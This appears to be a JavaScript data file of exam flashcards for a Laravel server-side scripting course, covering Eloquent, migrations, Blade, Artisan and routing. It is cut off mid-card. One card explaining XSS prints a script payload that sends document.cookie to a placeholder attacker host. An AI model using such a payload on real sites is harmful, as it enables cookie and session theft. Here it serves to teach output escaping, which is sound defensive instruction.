window.CONTENT["COMP3975"] = {"meta":{"id":"COMP3975","code":"COMP 3975","name":"Server-Side Web Scripting","exam":"2026-04-23T10:30:00-07:00","room":"— see course page","format":"60 MCQ + 10 match-two-columns + 1 coding · 80 marks · 60 min","cheatsheet_allowed":true,"practice_allowed":true,"instructor":"Medhat Elmasry","notes_html":"\u003cp\u003eOne handwritten cheat sheet (8.5×11&quot;, both sides) allowed.\nCovers Weeks 7–13 (Laravel, JWT, Swagger, Localization, MCP, Azure Static Web Apps).\u003c/p\u003e"},"modules":[{"id":"laravel-database","name":"Laravel Database","topics":[{"id":"eloquent-orm","name":"Eloquent ORM","tags":["eloquent","orm","laravel","database"],"prose":"Eloquent ORM is Laravel's object-relational mapper. Each model class maps to a database table; methods like all(), find(), findOrFail(), create(), and delete() translate PHP calls into SQL automatically.","cards":[{"type":"name","prompt":"What Artisan command creates a Student model AND its migration in one step?","answer":"php artisan make:model Student -m","explanation":"The -m flag generates the matching migration file alongside the model. Without it you would run make:model and make:migration separately.","example":"Running `php artisan make:model Student -m` produces app/Models/Student.php and a file like database/migrations/2024_03_21_000000_create_students_table.php.","source":"laravel_with_students_MySQL_SCRIPT.docx","bloom":"remember"},{"type":"cloze","prompt":"To allow mass assignment on the FirstName and School columns, add `protected {{$fillable}} = ['FirstName', 'School'];` to the model.","answer":"$fillable","explanation":"$fillable is a whitelist array on an Eloquent model. Only listed columns may be set through create() or update(). Columns absent from the list are silently blocked, preventing attackers from setting fields like is_admin.","example":"Without $fillable, calling Student::create($request-\u003eall()) throws a MassAssignmentException even if your form only sends safe fields.","source":"laravel_with_sqlite_API_SCRIPT.docx","bloom":"remember"},{"type":"name","prompt":"Which Eloquent method returns a model instance or throws a 404 if the record does not exist?","answer":"findOrFail()","explanation":"findOrFail() throws a ModelNotFoundException when the id is not found. Laravel automatically converts that exception to an HTTP 404 response — you get safe error handling without writing an if-statement.","example":"`$student = Student::findOrFail($id);` — if id=99 does not exist, the user sees a 404 page rather than a PHP error.","source":"laravel_with_students_MySQL_SCRIPT.docx","bloom":"understand"},{"type":"cloze","prompt":"To fetch students filtered by School not null and sorted by FirstName, you write: `Student::whereNotNull('School')-\u003eorderBy('FirstName')-\u003e{{get}}();`","answer":"get","explanation":"Builder method chains on a model do not execute until you call -\u003eget(). Without get(), you hold an unresolved query object, not a Collection. Student::all() is the only read method that executes without a terminal call.","example":"Student::where('School', 'Mining')-\u003eget() runs SELECT * FROM students WHERE School = 'Mining'. Omitting -\u003eget() returns a Builder, not data.","source":"TIDBITS-components_config_db_SCRIPT.docx","bloom":"apply"},{"type":"name","prompt":"What is the correct way to insert a new Student when you already have an array of field values from a form request?","answer":"Student::create(['FirstName' =\u003e ..., 'LastName' =\u003e ..., 'School' =\u003e ...])","explanation":"create() accepts an associative array and executes an INSERT in one call. It requires $fillable to be defined on the model — without it Laravel throws MassAssignmentException as a security guard.","example":"Student::create(['FirstName' =\u003e 'Ann', 'LastName' =\u003e 'Fox', 'School' =\u003e 'Business']) inserts one row and returns the new Student instance.","source":"laravel_with_students_MySQL_SCRIPT.docx","bloom":"apply"},{"type":"cloze","prompt":"After retrieving a student with findOrFail, you update its properties and call `$student-\u003e{{save}}()` to persist changes.","answer":"save","explanation":"save() works for both inserts (on a new Student instance) and updates (on an existing one). Eloquent detects whether the model has a primary key set and issues INSERT or UPDATE accordingly.","example":"$student-\u003eFirstName = 'Tom'; $student-\u003esave(); — Eloquent runs UPDATE students SET FirstName='Tom' WHERE id=X.","source":"laravel_with_students_MySQL_SCRIPT.docx","bloom":"apply"},{"type":"name","prompt":"In Laravel's recommended data-access hierarchy, which pattern comes first: Eloquent ORM, Query Builder, or raw SQL?","answer":"Eloquent ORM","explanation":"Laravel's documented preference order is Eloquent first (typed model instances, readable, relationship-aware), Query Builder second (fluent chaining without a model), raw SQL third (plain strings, highest maintenance cost). Eloquent is preferred because it ties directly to the model layer and works with all Laravel first-party features.","example":"Use Student::all() before reaching for DB::table('students')-\u003eget(), and reach for DB::select() only as a last resort.","source":"TIDBITS-components_config_db_SCRIPT.docx","bloom":"understand"},{"type":"cloze","prompt":"`Student::{{all}}()` fetches every row; it cannot be followed by a -\u003ewhere() filter that runs at the SQL level.","answer":"all","explanation":"Student::all() immediately executes SELECT * and returns a Collection in PHP memory. Chaining -\u003ewhere() after it filters the in-memory Collection in PHP, not at the database. For SQL-level filtering, use Student::where(...)-\u003eget().","example":"Student::all()-\u003ewhere('School', 'Mining') loads all 10,000 students into PHP first, then discards most of them. Student::where('School', 'Mining')-\u003eget() sends one efficient SQL query.","source":"TIDBITS-components_config_db_SCRIPT.docx","bloom":"analyze"},{"type":"name","prompt":"Which interactive Artisan REPL lets you test Eloquent queries without writing a controller?","answer":"tinker","explanation":"php artisan tinker opens a REPL with full Laravel context. You can call any Eloquent method directly — Student::all(), new Student(), save() — and see results instantly. It is the standard tool for verifying model behavior during development — no browser or controller needed.","example":"In tinker: `\\App\\Models\\Student::all()` returns the full collection; `$s = new \\App\\Models\\Student(); $s-\u003eFirstName='Joe'; $s-\u003esave();` inserts a row.","source":"laravel_with_students_MySQL_SCRIPT.docx","bloom":"remember"},{"type":"name","prompt":"A Student record exists with id=5. What does Student::find(5) return versus Student::find(999) when 999 does not exist?","answer":"find(5) returns the Student model instance; find(999) returns null","explanation":"find() returns the model or null — it never throws. Use findOrFail() when a missing record should be a 404. Use find() when you need to handle the null case yourself, for example to return a custom JSON error message.","example":"if (!$student = Student::find($id)) { return response()-\u003ejson(['message' =\u003e 'Not found'], 404); }","source":"laravel_with_sqlite_API_SCRIPT.docx","bloom":"analyze"}]},{"id":"model-relationships","name":"Eloquent Relationships","tags":["eloquent","relationships","laravel"],"prose":"Eloquent's hasMany() and belongsTo() declare a one-to-many relationship between two models. Declaring them once unlocks relationship-aware querying, creation, and ownership checks throughout your controllers.","cards":[{"type":"name","prompt":"What Eloquent method do you add to the parent model (e.g. User) to declare it has many child records (e.g. Org)?","answer":"hasMany()","explanation":"hasMany() is placed on the parent side of a one-to-many relationship. It tells Eloquent to look for a foreign key on the child table named after the parent model (e.g. user_id on the orgs table).","example":"public function orgs() { return $this-\u003ehasMany(Org::class); }","source":"auth-with-breeze_SQLite_SCRIPT.docx §Eloquent Relationships","bloom":"remember"},{"type":"name","prompt":"What Eloquent method do you add to the child model (e.g. Org) to declare it belongs to a parent (e.g. User)?","answer":"belongsTo()","explanation":"belongsTo() is placed on the child side. It lets you traverse from a child record up to its parent: $org-\u003euser returns the related User model. The method name should be singular (user, not users).","example":"public function user() { return $this-\u003ebelongsTo(User::class); }","source":"auth-with-breeze_SQLite_SCRIPT.docx §Eloquent Relationships","bloom":"remember"},{"type":"cloze","prompt":"To fetch all orgs for the currently logged-in user via the relationship chain, you write: {{Auth::user()-\u003eorgs()}}-\u003elatest('updated_at')-\u003eget();","answer":"Auth::user()-\u003eorgs()","explanation":"Auth::user() returns the authenticated User model. Calling orgs() on it (with parentheses) returns a query builder scoped to that user's orgs via the hasMany relationship. You can chain further constraints before calling get().","example":"$orgs = Auth::user()-\u003eorgs()-\u003elatest('updated_at')-\u003eget();","source":"auth-with-breeze_SQLite_SCRIPT.docx §Query & Save relationships","bloom":"apply"},{"type":"cloze","prompt":"The whereBelongsTo() shorthand for fetching the current user's orgs is: Org::{{whereBelongsTo(Auth::user())}}-\u003elatest('updated_at')-\u003eget();","answer":"whereBelongsTo(Auth::user())","explanation":"whereBelongsTo() filters a query to records whose foreign key matches the given model instance. It is the most readable form and requires the belongsTo relationship to be declared on Org. It replaces Org::where('user_id', Auth::id()).","example":"$orgs = Org::whereBelongsTo(Auth::user())-\u003elatest('updated_at')-\u003eget();","source":"auth-with-breeze_SQLite_SCRIPT.docx §Query & Save relationships","bloom":"apply"},{"type":"name","prompt":"In the ownership check pattern, what method compares two Eloquent model instances by primary key?","answer":"is()","explanation":"is() returns true when two model instances have the same primary key value. Used as: $org-\u003euser-\u003eis(Auth::user()). This is the canonical way to verify a resource belongs to the current user before allowing show/edit/delete.","example":"if (!$org-\u003euser-\u003eis(Auth::user())) { return abort(403); }","source":"auth-with-breeze_SQLite_SCRIPT.docx §Query & Save relationships","bloom":"understand"},{"type":"cloze","prompt":"When creating a new org through the relationship, you write Auth::user()-\u003eorgs()-\u003e{{create([...])}} — this automatically sets the {{user_id}} foreign key.","answer":"create([...]); user_id","explanation":"Calling create() on a relationship query builder automatically injects the parent's primary key as the foreign key value. You never need to pass user_id manually. The Org model's $fillable array must still list all other attributes.","example":"Auth::user()-\u003eorgs()-\u003ecreate(['orgName' =\u003e $request-\u003eorgName, ...]);","source":"auth-with-breeze_SQLite_SCRIPT.docx §Query & Save relationships","bloom":"apply"},{"type":"name","prompt":"What migration column declaration creates the user_id foreign key with a referential constraint on the users table?","answer":"$table-\u003eforeignId('user_id')-\u003econstrained()","explanation":"foreignId() creates an unsigned big integer column. constrained() adds the foreign key constraint that references the id column of the users table (inferred from the column name). Without this, relationship queries return empty results with no error.","example":"Schema::create('orgs', function (Blueprint $table) { $table-\u003eforeignId('user_id')-\u003econstrained(); });","source":"auth-with-breeze_SQLite_SCRIPT.docx §Database Model","bloom":"remember"},{"type":"name","prompt":"What is the key difference between accessing $org-\u003euser (property) vs $org-\u003euser() (method call) on an Eloquent model?","answer":"Property returns a cached model; method returns a query builder you can chain.","explanation":"Accessing a relationship as a property (no parentheses) triggers lazy loading and returns the related model or collection directly. Calling it as a method (with parentheses) returns a query builder, allowing you to chain where(), latest(), paginate(), etc. Using the property form and then chaining query methods causes a fatal error.","example":"$org-\u003euser           // returns User model (cached)\n$org-\u003euser()-\u003efirst() // query builder form","source":"auth-with-breeze_SQLite_SCRIPT.docx §Query & Save relationships","bloom":"understand"}]},{"id":"migrations-and-seeders","name":"Migrations and Seeders","tags":["laravel","migrations","seeders","database-schema"],"prose":"Migrations are PHP classes that define and version your database schema. Seeders populate tables with sample data. Together they let you rebuild a clean, consistent database with a single Artisan command.","cards":[{"type":"cloze","prompt":"To create a Student model and its migration at the same time, run: `php artisan make:model Student {{-m}}`.","answer":"-m","explanation":"The -m flag tells Artisan to generate a migration file alongside the model. Without it you only get the model class and must create the migration separately.","example":"Running `php artisan make:model Student -m` produces `app/Models/Student.php` and a timestamped file in `database/migrations/`.","source":"laravel_with_students_MySQL_SCRIPT.docx","bloom":"remember"},{"type":"cloze","prompt":"To apply all pending migrations to the database, run: `php artisan {{migrate}}`.","answer":"migrate","explanation":"Laravel compares each migration file's timestamp against the `migrations` table in the database and runs only the files that have not been applied yet.","example":"After adding `$table-\u003estring('School');` to a new migration file, `php artisan migrate` creates the column in the live database.","source":"laravel_with_students_MySQL_SCRIPT.docx","bloom":"remember"},{"type":"cloze","prompt":"The command `php artisan migrate:refresh {{--seed}}` drops all tables, re-runs every migration, and then runs all registered seeders.","answer":"--seed","explanation":"The --seed flag causes Artisan to call DatabaseSeeder::run() after the refresh completes. Without it, migrate:refresh only rebuilds the schema with no data.","example":"During development, `php artisan migrate:refresh --seed` resets the students table and repopulates it via StudentSeeder.","source":"laravel_with_students_MySQL_SCRIPT.docx; laravel_with_sqlite_API_SCRIPT.docx","bloom":"remember"},{"type":"name","prompt":"A PHP class in `database/migrations/` with `up()` and `down()` methods that defines a database schema change — what is it called?","answer":"A migration","explanation":"Migrations version your schema the same way git versions code. The `up()` method applies the change; `down()` reverses it, enabling rollback.","example":"`Schema::create('students', function (Blueprint $table) { $table-\u003eid(); $table-\u003estring('FirstName'); });` is a typical `up()` body.","source":"laravel_with_students_MySQL_SCRIPT.docx","bloom":"understand"},{"type":"name","prompt":"Which Artisan command creates a new seeder class file in `database/seeders/`?","answer":"`php artisan make:seeder StudentSeeder`","explanation":"The generated class has an empty `run()` method where you write the insert logic. It does nothing until you register it in DatabaseSeeder and run `db:seed` or `migrate:refresh --seed`.","example":"`php artisan make:seeder StudentSeeder` produces `database/seeders/StudentSeeder.php` with a `run(): void` stub.","source":"laravel_with_students_MySQL_SCRIPT.docx","bloom":"remember"},{"type":"name","prompt":"In `DatabaseSeeder.php`, what method call registers a custom seeder so it runs automatically during `php artisan migrate:refresh --seed`?","answer":"`$this-\u003ecall(StudentSeeder::class);`","explanation":"DatabaseSeeder is the entry point for all seeding. Without this registration, your custom seeder never fires even if the file exists.","example":"Adding `$this-\u003ecall(StudentSeeder::class);` inside DatabaseSeeder's `run()` method means StudentSeeder fires every time you seed.","source":"laravel_with_students_MySQL_SCRIPT.docx; laravel_with_sqlite_API_SCRIPT.docx","bloom":"understand"},{"type":"cloze","prompt":"A migration's `{{up()}}` method defines the schema change to apply, while its `{{down()}}` method defines how to reverse it.","answer":"up(), down()","explanation":"Laravel uses `down()` when you roll back a migration. Without a correct `down()`, rollback either fails or leaves orphan tables.","example":"A `down()` that calls `Schema::dropIfExists('students')` cleanly removes the table on rollback.","source":"laravel_with_students_MySQL_SCRIPT.docx","bloom":"understand"},{"type":"predict","lang":"php","prompt":"What table does this migration create, and which columns does it add beyond the defaults?","code":"Schema::create('students', function (Blueprint $table) {\n    $table-\u003eid();\n    $table-\u003estring('FirstName');\n    $table-\u003estring('LastName');\n    $table-\u003estring('School');\n    $table-\u003etimestamps();\n});\n","answer":"Creates the `students` table with columns: `id` (auto-increment PK), `FirstName` (VARCHAR 255), `LastName` (VARCHAR 255), `School` (VARCHAR 255), `created_at`, and `updated_at`. The developer added FirstName, LastName, School; the rest come from the builder helpers.","explanation":"`$table-\u003eid()` and `$table-\u003etimestamps()` are always present in the scaffold. You only write the domain-specific columns like FirstName, LastName, School.","source":"laravel_with_students_MySQL_SCRIPT.docx","bloom":"apply"}]},{"id":"query-builder-and-raw-sql","name":"Query Builder and Raw SQL","tags":["laravel","query-builder","raw-sql"],"prose":"Laravel offers three data-access patterns in explicit preference order: Eloquent ORM first, Query Builder (DB::table()) second, raw SQL (DB::select()) third. Query Builder chains fluent methods and returns stdClass objects; raw SQL takes a plain SQL string and also returns stdClass objects.","cards":[{"type":"cloze","prompt":"In Laravel's standard data-access preference order, from most to least preferred: {{Eloquent ORM}}, then {{Query Builder}}, then {{raw SQL}}.","answer":"Eloquent ORM, Query Builder, raw SQL","explanation":"Laravel ranks these three patterns by abstraction level and maintenance cost. Eloquent is preferred because it works with typed model instances and integrates with all first-party features. Query Builder is second — it chains fluently without requiring a model. Raw SQL is last — it forces you to write and maintain SQL strings manually.","example":"```php\n// 1st — Eloquent\n$students = Student::all();\n// 2nd — Query Builder\n$students = DB::table('students')-\u003eget();\n// 3rd — Raw SQL\n$students = DB::select('SELECT * FROM students');\n```\n","source":"TIDBITS-components_config_db_SCRIPT.docx","bloom":"remember"},{"type":"cloze","prompt":"To start a Query Builder chain on the `students` table, you call {{DB::table('students')}}.","answer":"DB::table('students')","explanation":"DB is the facade for Laravel's database layer. Calling DB::table('table_name') creates a query builder instance for that table. You then chain select(), where(), orderBy(), and finish with get().","example":"```php\nuse Illuminate\\Support\\Facades\\DB;\n$rows = DB::table('students')-\u003eselect(['FirstName', 'LastName'])-\u003eget();\n```\n","source":"TIDBITS-components_config_db_SCRIPT.docx","bloom":"remember"},{"type":"name","prompt":"What terminal method must you call at the end of a Query Builder chain to actually execute the query and receive results?","answer":"-\u003eget()","explanation":"Every Query Builder method except get() returns the builder itself — the query is not sent to the database until get() is called. Omitting get() leaves you with a Builder object, not a collection of rows.","example":"```php\n// Without -\u003eget(): returns a Builder object, not results\n$q = DB::table('students')-\u003ewhereNotNull('School');\n// With -\u003eget(): executes and returns a collection of stdClass objects\n$students = DB::table('students')-\u003ewhereNotNull('School')-\u003eget();\n```\n","source":"TIDBITS-components_config_db_SCRIPT.docx","bloom":"understand"},{"type":"cloze","prompt":"To execute a raw SQL query in Laravel, you call {{DB::select('SELECT * FROM students')}}.","answer":"DB::select('SELECT * FROM students')","explanation":"DB::select() takes a raw SQL string and an optional array of parameter bindings. It returns an array of stdClass objects. Unlike Query Builder, it gives you no fluent methods — you write the full SQL string yourself.","example":"```php\n// Plain raw SQL\n$students = DB::select('SELECT * FROM students');\n\n// With a parameterised binding (safe against SQL injection)\n$students = DB::select('SELECT * FROM students WHERE School = ?', ['Mining']);\n```\n","source":"TIDBITS-components_config_db_SCRIPT.docx","bloom":"remember"},{"type":"name","prompt":"You want to add a WHERE School IS NOT NULL clause using Query Builder. Which method do you chain?","answer":"-\u003ewhereNotNull('School')","explanation":"whereNotNull() generates WHERE column IS NOT NULL in the query. It is one of many convenience methods on the Query Builder that translate readable PHP calls into correct SQL clauses, reducing the chance of SQL syntax errors.","example":"```php\n$students = DB::table('students')\n    -\u003eselect(['FirstName', 'LastName', 'School'])\n    -\u003ewhereNotNull('School')\n    -\u003eorderBy('FirstName')\n    -\u003eget();\n```\n","source":"TIDBITS-components_config_db_SCRIPT.docx","bloom":"apply"},{"type":"predict","lang":"php","prompt":"What type of objects does this Query Builder call return, and how does that differ from an Eloquent call?","code":"$students = DB::table('students')\n    -\u003eselect(['FirstName', 'LastName'])\n    -\u003eget();\n","answer":"Returns a collection of stdClass objects, not typed Student model instances. Eloquent's Student::all() returns Student model objects with model methods; Query Builder's DB::table() returns generic stdClass objects with no model methods.","explanation":"Because Query Builder does not know which Eloquent model the table belongs to, it cannot instantiate model objects. You access properties the same way ($item-\u003eFirstName) but you cannot call model methods like $item-\u003esave() or use relationships.","source":"TIDBITS-components_config_db_SCRIPT.docx","bloom":"understand"},{"type":"name","prompt":"Which two methods on the DB facade let you log and then retrieve the actual SQL queries that Laravel sends to the database?","answer":"DB::enableQueryLog() and DB::getQueryLog()","explanation":"Call DB::enableQueryLog() before running queries to start recording. Then call DB::getQueryLog() after to retrieve an array of the SQL strings and their bound parameter values. This is the primary debugging tool when a query returns unexpected results.","example":"```php\nDB::enableQueryLog();\n$students = DB::table('students')-\u003ewhereNotNull('School')-\u003eget();\nprint_r(DB::getQueryLog());\n```\n","source":"TIDBITS-components_config_db_SCRIPT.docx","bloom":"apply"}]}]},{"id":"laravel-foundations","name":"Laravel Foundations","topics":[{"id":"laravel-mvc-blade","name":"MVC and Blade Templating","tags":["laravel","mvc","blade","views"],"prose":"Laravel enforces MVC separation through opinionated directory conventions. Blade is the PHP templating engine built into Laravel — it replaces raw PHP in views with @-directives and the double-brace syntax for XSS-safe output.","cards":[{"id":"mvc-blade-card-01","type":"cloze","prompt":"In Laravel's MVC layout, controllers live in {{app/Http/Controllers/}}, models in {{app/Models/}}, and views in {{resources/views/}}.","answer":"app/Http/Controllers/, app/Models/, resources/views/","explanation":"Laravel is opinionated — putting code in the wrong directory causes the framework not to find it. The directory layout enforces MVC role separation at the filesystem level.","example":"A `UserController.php` in `app/Http/Controllers/` calls `User::all()` from `app/Models/User.php` and returns `view('users.index', compact('users'))`.","source":"intro_to_laravel.pptx slide 3","bloom":"remember"},{"id":"mvc-blade-card-02","type":"name","prompt":"What @-directive marks the injection point in a Blade parent layout where a child view's content will be inserted?","answer":"@yield('name')","explanation":"@yield is the slot declaration in the parent. It pairs with @section in the child. The string argument names the slot and must match exactly on both sides.","example":"Parent: `@yield('content')`. Child: `@section('content') \u003ch1\u003eHello\u003c/h1\u003e @endsection`.","source":"intro_to_laravel.pptx slides 18–19","bloom":"remember"},{"id":"mvc-blade-card-03","type":"cloze","prompt":"A child Blade view uses {{@extends('layouts.master')}} to inherit a layout and {{@section('content')}} ... {{@endsection}} to define its content block.","answer":"@extends('layouts.master'), @section('content'), @endsection","explanation":"@extends tells the child which parent layout to inherit. @section opens a named block in the child; @endsection closes it. Blade's compiler replaces @yield('content') in the parent with everything between @section and @endsection in the child. Without @endsection the compiler cannot locate the block boundary and throws a parse error — the template never renders.","example":"`@extends('layouts.master')` loads `resources/views/layouts/master.blade.php`.","source":"intro_to_laravel.pptx slides 18–19; intro_to_laravel_SCRIPT.docx §Creating your own blade template","bloom":"remember"},{"id":"mvc-blade-card-04","type":"name","prompt":"Which double-brace syntax escapes HTML entities and is therefore XSS-safe — `{{ $var }}` or `{!! $var !!}`?","answer":"{{ $var }}","explanation":"`{{ }}` calls htmlspecialchars() internally, converting `\u003c`, `\u003e`, and `&` to HTML entities — safe by default. `{!! !!}` outputs raw HTML and bypasses this protection; an attacker who controls the value can inject `\u003cscript\u003e` tags that execute in every visitor's browser (XSS). Use `{{ }}` by default; switch to `{!! !!}` only when you control the source entirely and have already sanitized the value.","example":"`{{ \"\u003cscript\u003ealert('xss')\u003c/script\u003e\" }}` renders as visible text. `{!! \"\u003cscript\u003ealert('xss')\u003c/script\u003e\" !!}` executes the script.","source":"intro_to_laravel.pptx slide 25","bloom":"understand"},{"id":"mvc-blade-card-05","type":"cloze","prompt":"Using {{'{!! $userInput !!}'}} without sanitizing $userInput creates an {{XSS}} vulnerability because Blade outputs the value as {{raw HTML}}.","answer":"{!! $userInput !!}, XSS, raw HTML","explanation":"XSS (cross-site scripting) lets attackers inject script tags that run in the victim's browser. Blade's `{{ }}` prevents this by escaping output. `{!! !!}` is opt-in and requires you to own or sanitize the content first.","example":"An attacker sets their username to `\u003cscript\u003efetch('evil.com?c='+document.cookie)\u003c/script\u003e`. Rendering it with `{!! $user-\u003ename !!}` sends the user's cookies to the attacker.","source":"intro_to_laravel.pptx slide 25; intro_to_laravel_SCRIPT.docx §Cross site scripting attack protection","bloom":"understand"},{"id":"mvc-blade-card-06","type":"name","prompt":"Which @-directive embeds a reusable Blade template fragment (a partial view) at a given location in another Blade file?","answer":"@include('path.to.partial')","explanation":"@include inserts the partial view inline. The partial view receives all variables currently in scope. Dot-notation maps to the directory path under `resources/views/`.","example":"`@include('partials.header')` loads `resources/views/partials/header.blade.php`.","source":"intro_to_laravel.pptx slide 20; intro_to_laravel_SCRIPT.docx §Partial views","bloom":"remember"},{"id":"mvc-blade-card-07","type":"predict","lang":"blade","prompt":"What does this Blade snippet output if $id is 5?","code":"@if($id == 5)\n    \u003cp\u003eSecret!\u003c/p\u003e\n@endif\n\u003cul\u003e\n    @foreach(['a','b'] as $item)\n        \u003cli\u003e{{ $item }}\u003c/li\u003e\n    @endforeach\n\u003c/ul\u003e\n","answer":"Outputs `\u003cp\u003eSecret!\u003c/p\u003e` followed by an unordered list with items `a` and `b`. When $id is not 5, the paragraph is omitted.","explanation":"@if evaluates the condition and renders its block only when true. @foreach iterates the array. {{ }} escapes each value before rendering.","source":"intro_to_laravel.pptx slide 22; intro_to_laravel_SCRIPT.docx §Control structures","bloom":"apply"},{"id":"mvc-blade-card-08","type":"cloze","prompt":"The Blade component `\u003cx-master\u003e` maps to the file {{resources/views/components/master.blade.php}}, and named slots use the syntax {{\u003cx-slot name='content'\u003e}}.","answer":"resources/views/components/master.blade.php, \u003cx-slot name='content'\u003e","explanation":"Blade components are the modern equivalent of @extends/@section. The `x-` prefix is the component tag convention. Named slots allow multiple injection points in one component.","example":"Inside the component file, `{{ $content }}` renders the slot — not `@yield('content')`.","source":"TIDBITS-components_config_db_SCRIPT.docx §Blade Components","bloom":"understand"},{"id":"mvc-blade-card-09","type":"name","prompt":"In a Blade component file, how do you render the content passed via `\u003cx-slot name='content'\u003e`?","answer":"{{ $content }}","explanation":"Blade components pass each named slot as a PHP variable. The slot name becomes the variable name. This differs from the @yield pattern used in layout inheritance.","example":"Component file: `\u003cdiv class='container'\u003e{{ $content }}\u003c/div\u003e`. Caller: `\u003cx-master\u003e\u003cx-slot name='content'\u003eHello\u003c/x-slot\u003e\u003c/x-master\u003e`.","source":"TIDBITS-components_config_db_SCRIPT.docx §Blade Components","bloom":"apply"},{"id":"mvc-blade-card-10","type":"name","prompt":"In Laravel MVC, which layer is responsible for querying the database — the Model, the View, or the Controller?","answer":"Model","explanation":"The View renders HTML only; it receives data from the controller. The Controller coordinates work but delegates data access to the Model. Mixing database calls into views breaks MVC separation and makes code hard to test.","example":"Controller: `$users = User::all(); return view('users.index', compact('users'));`. The view receives `$users` as a variable — it never calls the database.","source":"laravel_with_students_MySQL_SCRIPT.docx","bloom":"understand"},{"id":"mvc-blade-card-11","type":"cloze","prompt":"A Blade comment uses the syntax {{'{{'}}{{-- ... --}}{{'}}'}} and is {{not sent to the browser}} in the compiled HTML output.","answer":"{{-- ... --}}, not sent to the browser","explanation":"HTML comments (`\u003c!-- --\u003e`) are visible in page source. Blade comments (`{{-- --}}`) are stripped at compile time and never reach the browser — useful for notes that should not be public.","example":"`{{-- TODO: remove this before production --}}` leaves no trace in the rendered HTML.","source":"intro_to_laravel.pptx slide 24; intro_to_laravel_SCRIPT.docx §Comments in view blades","bloom":"remember"}]},{"id":"artisan-composer","name":"Artisan CLI and Composer","tags":["artisan","composer","cli","laravel"],"prose":"Composer creates and manages Laravel projects; Artisan is Laravel's built-in CLI for scaffolding files, running the server, and managing the app lifecycle. Every Artisan command uses the `php artisan` prefix with colon-separated subcommands.","cards":[{"type":"name","prompt":"What single Artisan command creates a new Eloquent model AND its database migration at the same time?","answer":"php artisan make:model ModelName -m","explanation":"The `-m` flag tells Artisan to generate a matching migration alongside the model file. Without it you get only the model and must run `make:migration` separately.","example":"`php artisan make:model Student -m` produces `app/Models/Student.php` and a timestamped migration in `database/migrations/`.","source":"laravel_with_sqlite_API_SCRIPT.docx","bloom":"remember"},{"type":"cloze","prompt":"Artisan scaffold commands use a {{colon}} separator, not a hyphen — for example, `php artisan {{make:migration}} create_students_table`.","answer":"colon; make:migration","explanation":"Laravel's command namespaces are colon-delimited (`make:migration`, `make:controller`, `make:model`). The hyphen form is a common distractor on the exam and does not exist.","example":"final-practice.docx Q6: option (b) `php artisan make:migration user-table` is correct; option (c) `php artisan make-migration user-table` is wrong.","source":"intro_to_laravel.pptx slide 10; final-practice.docx Q6","bloom":"remember"},{"type":"name","prompt":"Which Artisan command opens an interactive REPL that lets you query Eloquent models directly in the terminal?","answer":"php artisan tinker","explanation":"Tinker boots the full Laravel application in a REPL so you can run Eloquent queries, test relationships, and inspect data without writing a controller or opening a browser.","example":"After running `php artisan tinker`, you can type `\\App\\Models\\Student::all()` to see all rows in the students table.","source":"Week9 - Table of Contents.html","bloom":"understand"},{"type":"cloze","prompt":"To scaffold a controller with all seven RESTful methods (index, create, store, show, edit, update, destroy), you run `php artisan make:controller Name {{--resource}}`.","answer":"--resource","explanation":"The `--resource` flag tells Artisan to pre-populate the controller with all standard RESTful method stubs. Without it, the controller is generated empty.","example":"`php artisan make:controller api/StudentsController --resource` creates a controller with all 7 CRUD-mapped methods ready to fill in.","source":"laravel_with_sqlite_API_SCRIPT.docx","bloom":"remember"},{"type":"name","prompt":"You edited `.env` to change the database name, but Laravel is still connecting to the old database. Which Artisan command clears the cached configuration?","answer":"php artisan config:clear","explanation":"Laravel caches configuration for performance. When you change `.env` or any file under `config/`, run `php artisan config:clear` to force Laravel to re-read the updated values.","example":"Run `php artisan config:clear` after changing `DB_DATABASE` in `.env`, then restart the server.","source":"intro_to_laravel.pptx slide 10","bloom":"understand"},{"type":"name","prompt":"What is the Composer command to create a brand-new Laravel project in a folder called `my-app`?","answer":"composer create-project laravel/laravel my-app","explanation":"Composer downloads the Laravel skeleton and all dependencies into `my-app/`. The `vendor/` folder it creates is git-ignored; teammates restore it with `composer install`.","example":"Running `composer create-project laravel/laravel laravel-rocks` followed by `php artisan serve --port=8888` gives you a working app at `http://localhost:8888`.","source":"intro_to_laravel.pptx slide 6; intro_to_laravel_SCRIPT.docx","bloom":"remember"},{"type":"cloze","prompt":"After cloning a Laravel repo where `vendor/` is missing, you restore all dependencies with `{{composer install}}`.","answer":"composer install","explanation":"`composer install` reads `composer.json` and downloads every listed package. `composer create-project` is only for initial project creation, not restoration.","example":"`vendor/` is in `.gitignore` by default; `composer install` is the standard onboarding step for any cloned Laravel project.","source":"intro_to_laravel_SCRIPT.docx","bloom":"understand"},{"type":"name","prompt":"Which Artisan command drops all tables, runs every migration fresh, and then runs all seeders?","answer":"php artisan migrate:refresh --seed","explanation":"`migrate:refresh` rolls back then re-applies every migration. The `--seed` flag then invokes all database seeders, giving you a clean populated database in one step.","example":"Use `php artisan migrate:refresh --seed` during development whenever you change a migration and need sample data rebuilt from scratch.","source":"laravel_with_sqlite_API_SCRIPT.docx","bloom":"remember"}]},{"id":"laravel-routing-controllers","name":"Routes and Resource Controllers","tags":["laravel","routing","controllers"],"prose":"Laravel's resource routing maps HTTP verbs to controller methods by convention. Route::apiResource() registers five endpoints with one line, binding GET/POST/PUT/DELETE to index, store, show, update, and destroy. Middleware chains protect routes; route caching optimises production performance but must be cleared after every routing change.\n","cards":[{"id":"routing-card-01","type":"cloze","prompt":"To register all five RESTful API routes for a StudentsController in one line, write: {{Route::apiResource('students', StudentsController::class)}}.\n","answer":"Route::apiResource('students', StudentsController::class)","explanation":"Route::apiResource() binds GET /students → index, POST /students → store, GET /students/{id} → show, PUT /students/{id} → update, and DELETE /students/{id} → destroy. It omits create and edit because those return HTML forms a JSON API never needs.\n","example":"```php\n// routes/api.php\nRoute::apiResource('students', StudentsController::class);\n```\n","source":"laravel_with_sqlite_API_SCRIPT.docx","bloom":"apply"},{"id":"routing-card-02","type":"name","prompt":"Route::resource() registers 7 methods. Route::apiResource() registers only 5. Which two methods does apiResource() drop, and why?\n","answer":"create and edit — they return HTML forms, which a JSON API does not need","explanation":"create() serves the \"new item\" HTML form; edit() serves the \"edit item\" HTML form. Stateless JSON APIs never render forms, so Laravel excludes these two methods when you use apiResource().\n","example":"```php\n// web.php — 7 methods including create and edit\nRoute::resource('posts', PostController::class);\n\n// api.php — 5 methods, no create or edit\nRoute::apiResource('posts', PostController::class);\n```\n","source":"laravel_with_sqlite_API_SCRIPT.docx","bloom":"understand"},{"id":"routing-card-03","type":"cloze","prompt":"The 5 controller method names bound by Route::apiResource() are: {{index}}, {{store}}, {{show}}, {{update}}, and {{destroy}}.\n","answer":"index, store, show, update, 